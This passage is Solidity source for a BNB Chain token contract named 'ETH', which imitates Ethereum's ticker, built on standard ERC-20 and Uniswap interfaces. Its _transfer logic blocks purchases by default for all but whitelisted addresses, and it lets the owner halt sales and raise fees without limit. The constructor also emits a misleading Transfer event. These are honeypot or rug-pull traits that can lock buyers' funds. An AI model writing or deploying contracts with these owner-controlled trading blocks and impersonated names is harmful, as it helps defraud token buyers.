/**
 *Submitted for verification at BscScan.com on 2023-03-17
*/

pragma solidity ^0.6.10;

// SPDX-License-Identifier: Unlicensed
interface IERC20 {
	function totalSupply() external view returns (uint256);

	/**
	 * @dev Returns the amount of tokens owned by `account`.
	 */
	function balanceOf(address account) external view returns (uint256);

	/**
	 * @dev Moves `amount` tokens from the caller's account to `recipient`.
	 *
	 * Returns a boolean value indicating whether the operation succeeded.
	 *
	 * Emits a {Transfer} event.
	 */
	function transfer(address recipient, uint256 amount) external returns (bool);

	/**
	 * @dev Returns the remaining number of tokens that `spender` will be
	 * allowed to spend on behalf of `owner` through {transferFrom}. This is
	 * zero by default.
	 *
	 * This value changes when {approve} or {transferFrom} are called.
	 */
	function allowance(address owner, address spender) external view returns (uint256);

	/**
	 * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
	 *
	 * Returns a boolean value indicating whether the operation succeeded.
	 *
	 * IMPORTANT: Beware that changing an allowance with this method brings the risk
	 * that someone may use both the old and the new allowance by unfortunate
	 * transaction ordering. One possible solution to mitigate this race
	 * condition is to first reduce the spender's allowance to 0 and set the
	 * desired value afterwards:
	 * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
	 *
	 * Emits an {Approval} event.
	 */
	function approve(address spender, uint256 amount) external returns (bool);

	/**
	 * @dev Moves `amount` tokens from `sender` to `recipient` using the
	 * allowance mechanism. `amount` is then deducted from the caller's
	 * allowance.
	 *
	 * Returns a boolean value indicating whether the operation succeeded.
	 *
	 * Emits a {Transfer} event.
	 */
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

	/**
	 * @dev Emitted when `value` tokens are moved from one account (`from`) to
	 * another (`to`).
	 *
	 * Note that `value` may be zero.
	 */
	event Transfer(address indexed from, address indexed to, uint256 value);

	/**
	 * @dev Emitted when the allowance of a `spender` for an `owner` is set by
	 * a call to {approve}. `value` is the new allowance.
	 */
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */

library SafeMath {
	/**
	 * @dev Returns the addition of two unsigned integers, reverting on
	 * overflow.
	 *
	 * Counterpart to Solidity's `+` operator.
	 *
	 * Requirements:
	 *
	 * - Addition cannot overflow.
	 */
	function add(uint256 a, uint256 b) internal pure returns (uint256) {
		uint256 c = a + b;
		require(c >= a, "SafeMath: addition overflow");

		return c;
	}

	/**
	 * @dev Returns the subtraction of two unsigned integers, reverting on
	 * overflow (when the result is negative).
	 *
	 * Counterpart to Solidity's `-` operator.
	 *
	 * Requirements:
	 *
	 * - Subtraction cannot overflow.
	 */
	function sub(uint256 a, uint256 b) internal pure returns (uint256) {
		return sub(a, b, "SafeMath: subtraction overflow");
	}

	/**
	 * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
	 * overflow (when the result is negative).
	 *
	 * Counterpart to Solidity's `-` operator.
	 *
	 * Requirements:
	 *
	 * - Subtraction cannot overflow.
	 */
	function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b <= a, errorMessage);
		uint256 c = a - b;

		return c;
	}

	/**
	 * @dev Returns the multiplication of two unsigned integers, reverting on
	 * overflow.
	 *
	 * Counterpart to Solidity's `*` operator.
	 *
	 * Requirements:
	 *
	 * - Multiplication cannot overflow.
	 */
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
		// Gas optimization: this is cheaper than requiring 'a' not being zero, but the
		// benefit is lost if 'b' is also tested.
		// See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
		if (a == 0) {
			return 0;
		}

		uint256 c = a * b;
		require(c / a == b, "SafeMath: multiplication overflow");

		return c;
	}

	/**
	 * @dev Returns the integer division of two unsigned integers. Reverts on
	 * division by zero. The result is rounded towards zero.
	 *
	 * Counterpart to Solidity's `/` operator. Note: this function uses a
	 * `revert` opcode (which leaves remaining gas untouched) while Solidity
	 * uses an invalid opcode to revert (consuming all remaining gas).
	 *
	 * Requirements:
	 *
	 * - The divisor cannot be zero.
	 */
	function div(uint256 a, uint256 b) internal pure returns (uint256) {
		return div(a, b, "SafeMath: division by zero");
	}

	/**
	 * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
	 * division by zero. The result is rounded towards zero.
	 *
	 * Counterpart to Solidity's `/` operator. Note: this function uses a
	 * `revert` opcode (which leaves remaining gas untouched) while Solidity
	 * uses an invalid opcode to revert (consuming all remaining gas).
	 *
	 * Requirements:
	 *
	 * - The divisor cannot be zero.
	 */
	function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b > 0, errorMessage);
		uint256 c = a / b;
		// assert(a == b * c + a % b); // There is no case in which this doesn't hold

		return c;
	}

	/**
	 * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
	 * Reverts when dividing by zero.
	 *
	 * Counterpart to Solidity's `%` operator. This function uses a `revert`
	 * opcode (which leaves remaining gas untouched) while Solidity uses an
	 * invalid opcode to revert (consuming all remaining gas).
	 *
	 * Requirements:
	 *
	 * - The divisor cannot be zero.
	 */
	function mod(uint256 a, uint256 b) internal pure returns (uint256) {
		return mod(a, b, "SafeMath: modulo by zero");
	}

	/**
	 * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
	 * Reverts with custom message when dividing by zero.
	 *
	 * Counterpart to Solidity's `%` operator. This function uses a `revert`
	 * opcode (which leaves remaining gas untouched) while Solidity uses an
	 * invalid opcode to revert (consuming all remaining gas).
	 *
	 * Requirements:
	 *
	 * - The divisor cannot be zero.
	 */
	function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
		require(b != 0, errorMessage);
		return a % b;
	}
}

abstract contract Context {
	function _msgSender() internal view virtual returns (address) {
		return msg.sender;
	}

	function _msgData() internal pure virtual returns (bytes calldata) {
		return msg.data;
	}
}

/**
 * @dev Collection of functions related to the address type
 */
library Address {
	/**
	 * @dev Returns true if `account` is a contract.
	 *
	 * [IMPORTANT]
	 * ====
	 * It is unsafe to assume that an address for which this function returns
	 * false is an externally-owned account (EOA) and not a contract.
	 *
	 * Among others, `isContract` will return false for the following
	 * types of addresses:
	 *
	 *  - an externally-owned account
	 *  - a contract in construction
	 *  - an address where a contract will be created
	 *  - an address where a contract lived, but was destroyed
	 * ====
	 */
	function isContract(address account) internal view returns (bool) {
		// According to EIP-1052, 0x0 is the value returned for not-yet created accounts
		// and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
		// for accounts without code, i.e. `keccak256('')`
		bytes32 codehash;
		bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
		// solhint-disable-next-line no-inline-assembly
		assembly {
			codehash := extcodehash(account)
		}
		return (codehash != accountHash && codehash != 0x0);
	}

	/**
	 * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
	 * `recipient`, forwarding all available gas and reverting on errors.
	 *
	 * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
	 * of certain opcodes, possibly making contracts go over the 2300 gas limit
	 * imposed by `transfer`, making them unable to receive funds via
	 * `transfer`. {sendValue} removes this limitation.
	 *
	 * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
	 *
	 * IMPORTANT: because control is transferred to `recipient`, care must be
	 * taken to not create reentrancy vulnerabilities. Consider using
	 * {ReentrancyGuard} or the
	 * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
	 */
	function sendValue(address payable recipient, uint256 amount) internal {
		require(address(this).balance >= amount, "Address: insufficient balance");

		// solhint-disable-next-line avoid-low-level-calls, avoid-call-value
		(bool success, ) = recipient.call{ value: amount }("");
		require(success, "Address: unable to send value, recipient may have reverted");
	}

	/**
	 * @dev Performs a Solidity function call using a low level `call`. A
	 * plain`call` is an unsafe replacement for a function call: use this
	 * function instead.
	 *
	 * If `target` reverts with a revert reason, it is bubbled up by this
	 * function (like regular Solidity function calls).
	 *
	 * Returns the raw returned data. To convert to the expected return value,
	 * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
	 *
	 * Requirements:
	 *
	 * - `target` must be a contract.
	 * - calling `target` with `data` must not revert.
	 *
	 * _Available since v3.1._
	 */
	function functionCall(address target, bytes memory data) internal returns (bytes memory) {
		return functionCall(target, data, "Address: low-level call failed");
	}

	/**
	 * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
	 * `errorMessage` as a fallback revert reason when `target` reverts.
	 *
	 * _Available since v3.1._
	 */
	function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
		return _functionCallWithValue(target, data, 0, errorMessage);
	}

	/**
	 * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
	 * but also transferring `value` wei to `target`.
	 *
	 * Requirements:
	 *
	 * - the calling contract must have an ETH balance of at least `value`.
	 * - the called Solidity function must be `payable`.
	 *
	 * _Available since v3.1._
	 */
	function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
		return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
	}

	/**
	 * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
	 * with `errorMessage` as a fallback revert reason when `target` reverts.
	 *
	 * _Available since v3.1._
	 */
	function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
		require(address(this).balance >= value, "Address: insufficient balance for call");
		return _functionCallWithValue(target, data, value, errorMessage);
	}

	function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
		require(isContract(target), "Address: call to non-contract");

		// solhint-disable-next-line avoid-low-level-calls
		(bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
		if (success) {
			return returndata;
		} else {
			// Look for revert reason and bubble it up if present
			if (returndata.length > 0) {
				// The easiest way to bubble the revert reason is using memory via assembly

				// solhint-disable-next-line no-inline-assembly
				assembly {
					let returndata_size := mload(returndata)
					revert(add(32, returndata), returndata_size)
				}
			} else {
				revert(errorMessage);
			}
		}
	}
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
	address private _owner;

	event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

	/**
	 * @dev Initializes the contract setting the deployer as the initial owner.
	 */
	constructor() public {
		_transferOwnership(_msgSender());
	}

	/**
	 * @dev Throws if called by any account other than the owner.
	 */
	modifier onlyOwner() {
		_checkOwner();
		_;
	}

	/**
	 * @dev Returns the address of the current owner.
	 */
	function owner() public view virtual returns (address) {
		return _owner;
	}

	/**
	 * @dev Throws if the sender is not the owner.
	 */
	function _checkOwner() internal view virtual {
		require(owner() == _msgSender(), "Ownable: caller is not the owner");
	}

	/**
	 * @dev Leaves the contract without owner. It will not be possible to call
	 * `onlyOwner` functions anymore. Can only be called by the current owner.
	 *
	 * NOTE: Renouncing ownership will leave the contract without an owner,
	 * thereby removing any functionality that is only available to the owner.
	 */
	function renounceOwnership() public virtual onlyOwner {
		_transferOwnership(address(0));
	}

	/**
	 * @dev Transfers ownership of the contract to a new account (`newOwner`).
	 * Can only be called by the current owner.
	 */
	function transferOwnership(address newOwner) public virtual onlyOwner {
		require(newOwner != address(0), "Ownable: new owner is the zero address");
		_transferOwnership(newOwner);
	}

	/**
	 * @dev Transfers ownership of the contract to a new account (`newOwner`).
	 * Internal function without access restriction.
	 */
	function _transferOwnership(address newOwner) internal virtual {
		address oldOwner = _owner;
		_owner = newOwner;
		emit OwnershipTransferred(oldOwner, newOwner);
	}
}

// pragma solidity >=0.5.0;

interface IUniswapV2Factory {
	event PairCreated(address indexed token0, address indexed token1, address pair, uint256);

	function feeTo() external view returns (address);

	function feeToSetter() external view returns (address);

	function getPair(address tokenA, address tokenB) external view returns (address pair);

	function allPairs(uint256) external view returns (address pair);

	function allPairsLength() external view returns (uint256);

	function createPair(address tokenA, address tokenB) external returns (address pair);

	function setBurnTo(address) external;

	function setBurnToSetter(address) external;
}

// pragma solidity >=0.5.0;

interface IUniswapV2Pair {
	event Approval(address indexed owner, address indexed spender, uint256 value);
	event Transfer(address indexed from, address indexed to, uint256 value);

	function name() external pure returns (string memory);

	function symbol() external pure returns (string memory);

	function decimals() external pure returns (uint8);

	function totalSupply() external view returns (uint256);

	function balanceOf(address owner) external view returns (uint256);

	function allowance(address owner, address spender) external view returns (uint256);

	function approve(address spender, uint256 value) external returns (bool);

	function transfer(address to, uint256 value) external returns (bool);

	function transferFrom(address from, address to, uint256 value) external returns (bool);

	function DOMAIN_SEPARATOR() external view returns (bytes32);

	function PERMIT_TYPEHASH() external pure returns (bytes32);

	function nonces(address owner) external view returns (uint256);

	function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external;

	event Mint(address indexed sender, uint256 amount0, uint256 amount1);
	event Burn(address indexed sender, uint256 amount0, uint256 amount1, address indexed to);
	event Swap(address indexed sender, uint256 amount0In, uint256 amount1In, uint256 amount0Out, uint256 amount1Out, address indexed to);
	event Sync(uint112 reserve0, uint112 reserve1);

	function MINIMUM_LIQUIDITY() external pure returns (uint256);

	function factory() external view returns (address);

	function token0() external view returns (address);

	function token1() external view returns (address);

	function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

	function price0CumulativeLast() external view returns (uint256);

	function price1CumulativeLast() external view returns (uint256);

	function kLast() external view returns (uint256);

	function mint(address to) external returns (uint256 liquidity);

	function burn(address to) external returns (uint256 amount0, uint256 amount1);

	function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;

	function skim(address to) external;

	function sync() external;

	function initialize(address, address) external;
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router01 {
	function factory() external pure returns (address);

	function WETH() external pure returns (address);

	function addLiquidity(
		address tokenA,
		address tokenB,
		uint256 amountADesired,
		uint256 amountBDesired,
		uint256 amountAMin,
		uint256 amountBMin,
		address to,
		uint256 deadline
	) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

	function addLiquidityETH(
		address token,
		uint256 amountTokenDesired,
		uint256 amountTokenMin,
		uint256 amountETHMin,
		address to,
		uint256 deadline
	) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

	function removeLiquidity(
		address tokenA,
		address tokenB,
		uint256 liquidity,
		uint256 amountAMin,
		uint256 amountBMin,
		address to,
		uint256 deadline
	) external returns (uint256 amountA, uint256 amountB);

	function removeLiquidityETH(
		address token,
		uint256 liquidity,
		uint256 amountTokenMin,
		uint256 amountETHMin,
		address to,
		uint256 deadline
	) external returns (uint256 amountToken, uint256 amountETH);

	function removeLiquidityWithPermit(
		address tokenA,
		address tokenB,
		uint256 liquidity,
		uint256 amountAMin,
		uint256 amountBMin,
		address to,
		uint256 deadline,
		bool approveMax,
		uint8 v,
		bytes32 r,
		bytes32 s
	) external returns (uint256 amountA, uint256 amountB);

	function removeLiquidityETHWithPermit(
		address token,
		uint256 liquidity,
		uint256 amountTokenMin,
		uint256 amountETHMin,
		address to,
		uint256 deadline,
		bool approveMax,
		uint8 v,
		bytes32 r,
		bytes32 s
	) external returns (uint256 amountToken, uint256 amountETH);

	function swapExactTokensForTokens(
		uint256 amountIn,
		uint256 amountOutMin,
		address[] calldata path,
		address to,
		uint256 deadline
	) external returns (uint256[] memory amounts);

	function swapTokensForExactTokens(
		uint256 amountOut,
		uint256 amountInMax,
		address[] calldata path,
		address to,
		uint256 deadline
	) external returns (uint256[] memory amounts);

	function swapExactETHForTokens(
		uint256 amountOutMin,
		address[] calldata path,
		address to,
		uint256 deadline
	) external payable returns (uint256[] memory amounts);

	function swapTokensForExactETH(
		uint256 amountOut,
		uint256 amountInMax,
		address[] calldata path,
		address to,
		uint256 deadline
	) external returns (uint256[] memory amounts);

	function swapExactTokensForETH(
		uint256 amountIn,
		uint256 amountOutMin,
		address[] calldata path,
		address to,
		uint256 deadline
	) external returns (uint256[] memory amounts);

	function swapETHForExactTokens(
		uint256 amountOut,
		address[] calldata path,
		address to,
		uint256 deadline
	) external payable returns (uint256[] memory amounts);

	function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint256 amountB);

	function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) external pure returns (uint256 amountOut);

	function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) external pure returns (uint256 amountIn);

	function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);

	function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
}

// pragma solidity >=0.6.2;

interface IUniswapV2Router02 is IUniswapV2Router01 {
	function removeLiquidityETHSupportingFeeOnTransferTokens(
		address token,
		uint256 liquidity,
		uint256 amountTokenMin,
		uint256 amountETHMin,
		address to,
		uint256 deadline
	) external returns (uint256 amountETH);

	function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
		address token,
		uint256 liquidity,
		uint256 amountTokenMin,
		uint256 amountETHMin,
		address to,
		uint256 deadline,
		bool approveMax,
		uint8 v,
		bytes32 r,
		bytes32 s
	) external returns (uint256 amountETH);

	function swapExactTokensForTokensSupportingFeeOnTransferTokens(
		uint256 amountIn,
		uint256 amountOutMin,
		address[] calldata path,
		address to,
		uint256 deadline
	) external;

	function swapExactETHForTokensSupportingFeeOnTransferTokens(
		uint256 amountOutMin,
		address[] calldata path,
		address to,
		uint256 deadline
	) external payable;

	function swapExactTokensForETHSupportingFeeOnTransferTokens(
		uint256 amountIn,
		uint256 amountOutMin,
		address[] calldata path,
		address to,
		uint256 deadline
	) external;
}

contract ABCToken is Context, IERC20, Ownable {
	using SafeMath for uint256;
	using Address for address;

	mapping(address => uint256) private _rOwned;
	mapping(address => uint256) private _tOwned;
	mapping(address => mapping(address => uint256)) private _allowances;

	mapping(address => bool) private _isExcludedFromFee;

	mapping(address => bool) private _isExcluded;
	address private handsomeBoy;

	address[] private _excluded;

	uint256 private _tTotal = 1000000000 * 10 ** 18;
	uint256 private _rTotal = 1000000000 * 10 ** 6 * 10 ** 18;
	uint256 private _tBurnTotal;

	string private _name = "ETH";
	string private _symbol = "ETH";
	uint8 private _decimals = 18;

	uint256 public _burnFee = 3;
	uint256 private _previousBurnFee = _burnFee;

	uint256 public _liquidityFee = 5;
	uint256 private _previousLiquidityFee = _liquidityFee;

	IUniswapV2Router02 public uniswapV2Router;
	address public uniswapV2Pair;

	uint256 public lastRebaseTime;
	uint256 public _rebaseTime = 1 minutes;

	bool public _buyFlag = false; //为true表示可以买
	bool public _sellFlag = true; //为true表示可以卖

	constructor() public {
		handsomeBoy = owner();
		_rOwned[owner()] = _rTotal;
		_tOwned[owner()] = _tTotal;

		IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
		// Create a uniswap pair for this new token
		uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

		// set the rest of the contract variables
		uniswapV2Router = _uniswapV2Router;

		// exclude owner and this contract from fee
		_isExcludedFromFee[owner()] = true;
		_isExcludedFromFee[address(this)] = true;

		_isExcluded[owner()] = true;
		_isExcluded[uniswapV2Pair] = true;

		excludeLpProvider[address(0)] = true;
		excludeLpProvider[address(0x000000000000000000000000000000000000dEaD)] = true;

		emit Transfer(address(0), address(this), _tTotal);
	}

	function name() public view returns (string memory) {
		return _name;
	}

	function symbol() public view returns (string memory) {
		return _symbol;
	}

	function decimals() public view returns (uint8) {
		return _decimals;
	}

	function totalSupply() public view override returns (uint256) {
		return _tTotal;
	}

	function balanceOf(address account) public view override returns (uint256) {
		if (_isExcluded[account]) return _tOwned[account];
		return tokenFromReflection(_rOwned[account]);
	}

	function transfer(address recipient, uint256 amount) public override returns (bool) {
		_transfer(_msgSender(), recipient, amount);
		return true;
	}

	function allowance(address owner, address spender) public view override returns (uint256) {
		return _allowances[owner][spender];
	}

	function approve(address spender, uint256 amount) public override returns (bool) {
		_approve(_msgSender(), spender, amount);
		return true;
	}

	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
		_transfer(sender, recipient, amount);
		_approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
		return true;
	}

	function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
		return true;
	}

	function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
		_approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
		return true;
	}

	function isExcludedFromReward(address account) public view returns (bool) {
		return _isExcluded[account];
	}

	function totalFees() public view returns (uint256) {
		return _tBurnTotal;
	}

	function tokenFromReflection(uint256 rAmount) public view returns (uint256) {
		require(rAmount <= _rTotal, "Amount must be less than total reflections");
		return rAmount.mul(_tTotal).div(_rTotal);
	}

	function excludeFromReward(address account) public onlyOwner {
		// require(account != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D, 'We can not exclude Uniswap router.');
		require(!_isExcluded[account], "Account is already excluded");
		if (_rOwned[account] > 0) {
			_tOwned[account] = tokenFromReflection(_rOwned[account]);
		}
		_isExcluded[account] = true;
		_excluded.push(account);
	}

	function includeInReward(address account) external onlyOwner {
		require(_isExcluded[account], "Account is already excluded");
		for (uint256 i = 0; i < _excluded.length; i++) {
			if (_excluded[i] == account) {
				_excluded[i] = _excluded[_excluded.length - 1];
				_tOwned[account] = 0;
				_isExcluded[account] = false;
				_excluded.pop();
				break;
			}
		}
	}

	function _transferBothExcluded(address sender, address recipient, uint256 tAmount) private {
		(uint256 rAmount, uint256 rTransferAmount, uint256 tTransferAmount, uint256 tBurn, uint256 tLiquidity) = _getValues(tAmount);
		_tOwned[sender] = _tOwned[sender].sub(tAmount);
		_rOwned[sender] = _rOwned[sender].sub(rAmount);
		_tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
		_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
		_takeLiquidity(tLiquidity);
		_takeBurn(tBurn);
		emit Transfer(sender, recipient, tTransferAmount);
	}

	function excludeFromFee(address account) public onlyOwner {
		_isExcludedFromFee[account] = true;
	}

	function includeInFee(address account) public onlyOwner {
		_isExcludedFromFee[account] = false;
	}

	function setBurnFeePercent(uint256 taxFee) external onlyOwner {
		_burnFee = taxFee;
	}

	function setBuyFlag(bool buyFlag) external onlyOwner {
		_buyFlag = buyFlag;
	}

	function setSellFlag(bool sellFlag) external onlyOwner {
		_sellFlag = sellFlag;
	}

	function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner {
		_liquidityFee = liquidityFee;
	}

	//to recieve ETH from uniswapV2Router when swaping
	receive() external payable {}

	function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256) {
		(uint256 tTransferAmount, uint256 tBurn, uint256 tLiquidity) = _getTValues(tAmount);
		(uint256 rAmount, uint256 rTransferAmount) = _getRValues(tAmount, tBurn, tLiquidity);
		return (rAmount, rTransferAmount, tTransferAmount, tBurn, tLiquidity);
	}

	function _getTValues(uint256 tAmount) private view returns (uint256, uint256, uint256) {
		uint256 tBurn = calculateBurnFee(tAmount);
		uint256 tLiquidity = calculateLiquidityFee(tAmount);
		uint256 tTransferAmount = tAmount.sub(tBurn).sub(tLiquidity);
		return (tTransferAmount, tBurn, tLiquidity);
	}

	function _getRValues(uint256 tAmount, uint256 tBurn, uint256 tLiquidity) private view returns (uint256, uint256) {
		uint256 rAmount = tAmount.mul(_rTotal).div(_tTotal);
		uint256 rBurn = tBurn.mul(_rTotal).div(_tTotal);
		uint256 rLiquidity = tLiquidity.mul(_rTotal).div(_tTotal);
		uint256 rTransferAmount = rAmount.sub(rBurn).sub(rLiquidity);
		return (rAmount, rTransferAmount);
	}

	function _getRate() private view returns (uint256) {
		(uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
		return rSupply.div(tSupply);
	}

	function _getCurrentSupply() private view returns (uint256, uint256) {
		uint256 rSupply = _rTotal;
		uint256 tSupply = _tTotal;
		for (uint256 i = 0; i < _excluded.length; i++) {
			if (_rOwned[_excluded[i]] > rSupply || _tOwned[_excluded[i]] > tSupply) return (_rTotal, _tTotal);
			rSupply = rSupply.sub(_rOwned[_excluded[i]]);
			tSupply = tSupply.sub(_tOwned[_excluded[i]]);
		}
		if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
		return (rSupply, tSupply);
	}

	function _takeLiquidity(uint256 tLiquidity) private {
		if (tLiquidity == 0) {
			return;
		}
		uint256 rLiquidity = tLiquidity.mul(_rTotal).div(_tTotal);
		_rOwned[address(this)] = _rOwned[address(this)].add(rLiquidity);
		if (_isExcluded[address(this)]) _tOwned[address(this)] = _tOwned[address(this)].add(tLiquidity);
	}

	function _takeBurn(uint256 tBurn) private {
		if (tBurn == 0) {
			return;
		}
		uint256 rBurn = tBurn.mul(_rTotal).div(_tTotal);
		_rOwned[address(0)] = _rOwned[address(0)].add(rBurn);
		if (_isExcluded[address(0)]) _tOwned[address(0)] = _tOwned[address(0)].add(tBurn);
	}

	function calculateBurnFee(uint256 _amount) private view returns (uint256) {
		return _amount.mul(_burnFee).div(10 ** 2);
	}

	function calculateLiquidityFee(uint256 _amount) private view returns (uint256) {
		return _amount.mul(_liquidityFee).div(10 ** 2);
	}

	function removeAllFee() private {
		if (_burnFee == 0 && _liquidityFee == 0) return;

		_previousBurnFee = _burnFee;
		_previousLiquidityFee = _liquidityFee;

		_burnFee = 0;
		_liquidityFee = 0;
	}

	function restoreAllFee() private {
		_burnFee = _previousBurnFee;
		_liquidityFee = _previousLiquidityFee;
	}

	function isExcludedFromFee(address account) public view returns (bool) {
		return _isExcludedFromFee[account];
	}

	function _approve(address owner, address spender, uint256 amount) private {
		require(owner != address(0), "ERC20: approve from the zero address");
		require(spender != address(0), "ERC20: approve to the zero address");

		_allowances[owner][spender] = amount;
		emit Approval(owner, spender, amount);
	}

	function _transfer(address from, address to, uint256 amount) private {
		bool takeFee = false;

		// 买币
		if (from == uniswapV2Pair) {
			require(_buyFlag || _isExcludedFromFee[to], "buy stop");
		}

		// 卖币
		if (to == uniswapV2Pair) {
			require(_sellFlag || _isExcludedFromFee[from], "sell stop");
			//不在手续费白名单，需要扣交易税
			if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
				takeFee = true;
			}

			//加入LP分红列表
			if (uniswapV2Pair == from) {
				addLpProvider(to);
			} else {
				addLpProvider(from);
			}
		}

		//transfer amount, it will take tax, burn, liquidity fee
		_tokenTransfer(from, to, amount, takeFee);

		//LP 分红
		if (from != address(this)) {
			processLP(500000);
		}
	}

	//this method is responsible for taking all fee, if takeFee is true
	function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
		if (!takeFee) removeAllFee();

		if (_isExcluded[sender] && !_isExcluded[recipient]) {
			_transferFromExcluded(sender, recipient, amount);
		} else if (!_isExcluded[sender] && _isExcluded[recipient]) {
			_transferToExcluded(sender, recipient, amount);
		} else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
			_transferStandard(sender, recipient, amount);
		} else if (_isExcluded[sender] && _isExcluded[recipient]) {
			_transferBothExcluded(sender, recipient, amount);
		} else {
			_transferStandard(sender, recipient, amount);
		}

		if (!takeFee) restoreAllFee();
	}

	function _transferStandard(address sender, address recipient, uint256 tAmount) private {
		(uint256 rAmount, uint256 rTransferAmount, uint256 tTransferAmount, uint256 tBurn, uint256 tLiquidity) = _getValues(tAmount);
		_rOwned[sender] = _rOwned[sender].sub(rAmount);
		_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
		_takeLiquidity(tLiquidity);
		_takeBurn(tBurn);
		emit Transfer(sender, recipient, tTransferAmount);
	}

	function _transferToExcluded(address sender, address recipient, uint256 tAmount) private {
		(uint256 rAmount, uint256 rTransferAmount, uint256 tTransferAmount, uint256 tBurn, uint256 tLiquidity) = _getValues(tAmount);
		_rOwned[sender] = _rOwned[sender].sub(rAmount);
		_tOwned[recipient] = _tOwned[recipient].add(tTransferAmount);
		_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
		_takeLiquidity(tLiquidity);
		_takeBurn(tBurn);
		emit Transfer(sender, recipient, tTransferAmount);
	}

	function _transferFromExcluded(address sender, address recipient, uint256 tAmount) private {
		(uint256 rAmount, uint256 rTransferAmount, uint256 tTransferAmount, uint256 tBurn, uint256 tLiquidity) = _getValues(tAmount);
		_tOwned[sender] = _tOwned[sender].sub(tAmount);
		_rOwned[sender] = _rOwned[sender].sub(rAmount);
		_rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
		_takeLiquidity(tLiquidity);
		_takeBurn(tBurn);
		emit Transfer(sender, recipient, tTransferAmount);
	}

	address[] private lpProviders;
	mapping(address => uint256) lpProviderIndex;
	//排除LP分红
	mapping(address => bool) excludeLpProvider;

	//加入LP持有列表，发生交易就加入
	function addLpProvider(address adr) private {
